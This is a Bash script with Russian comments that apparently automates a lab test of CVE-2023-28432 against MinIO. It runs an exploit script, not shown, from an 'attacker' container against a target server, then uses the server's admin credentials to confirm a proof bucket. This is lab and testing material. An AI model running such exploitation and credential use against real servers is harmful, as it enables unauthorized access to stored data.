#!/bin/bash
set -e

# Функция для обработки ошибок
handle_error() {
    echo "Ошибка на строке $1"
    exit 1
}
trap 'handle_error $LINENO' ERR

echo "=== Шаг 1: Создание виртуального окружения Python в контейнере attacker ==="
docker exec attacker bash -c "cd /root && python3 -m venv venv"
echo "Виртуальное окружение создано"

echo ""
echo "=== Шаг 2: Активация виртуального окружения и установка зависимостей ==="
docker exec attacker bash -c "cd /root && source venv/bin/activate && pip3 install boto3 requests"
echo "Зависимости установлены"

echo ""
echo "=== Шаг 3: Копирование файла minio_cve_exploit.py в контейнер attacker ==="
if [ ! -f minio_cve_exploit.py ]; then
    echo "Ошибка: файл minio_cve_exploit.py не найден в текущей директории"
    exit 1
fi
docker cp minio_cve_exploit.py attacker:/root/minio_cve_exploit.py
docker exec attacker chmod +x /root/minio_cve_exploit.py
# Проверка синтаксиса Python перед запуском
echo "Проверка синтаксиса Python файла..."
docker exec attacker bash -c "cd /root && python3 -m py_compile minio_cve_exploit.py" && echo "Синтаксис корректен" || echo "Ошибка синтаксиса!"
echo "Файл minio_cve_exploit.py скопирован и сделан исполняемым"

echo ""
echo "=== Шаг 4: Запуск эксплуатации CVE-2023-28432 на MinIO ==="
docker exec attacker bash -c "cd /root && source venv/bin/activate && python3 minio_cve_exploit.py http://172.20.0.103:9000"
echo ""

echo "=== Шаг 5: Проверка результата эксплуатации ==="
echo "Проверка созданного bucket в MinIO:"
docker exec attacker bash -c "cd /root && source venv/bin/activate && python3 << 'PYEOF'
import boto3
try:
    s3_client = boto3.client(
        's3',
        endpoint_url='http://172.20.0.103:9000',
        aws_access_key_id='minioadmin',
        aws_secret_access_key='minioadmin-vulhub',
        region_name='us-east-1'
    )
    buckets = s3_client.list_buckets()
    test_bucket = 'cve-2023-28432-exploit'
    bucket_names = [b['Name'] for b in buckets['Buckets']]
    if test_bucket in bucket_names:
        print(f'[+] Bucket {test_bucket} найден!')
        # Проверка содержимого
        objects = s3_client.list_objects_v2(Bucket=test_bucket)
        if 'Contents' in objects:
            for obj in objects['Contents']:
                print(f'    - {obj[\"Key\"]} (размер: {obj[\"Size\"]} байт)')
                # Чтение файла
                if obj['Key'] == 'exploitation_proof.txt':
                    content = s3_client.get_object(Bucket=test_bucket, Key=obj['Key'])
                    print('    Содержимое файла:')
                    print(content['Body'].read().decode('utf-8'))
    else:
        print(f'[-] Bucket {test_bucket} не найден')
except Exception as e:
    print(f'Ошибка при проверке: {e}')
PYEOF
" || echo "Ошибка при проверке результата"

echo ""
echo "=== Тест завершен ==="
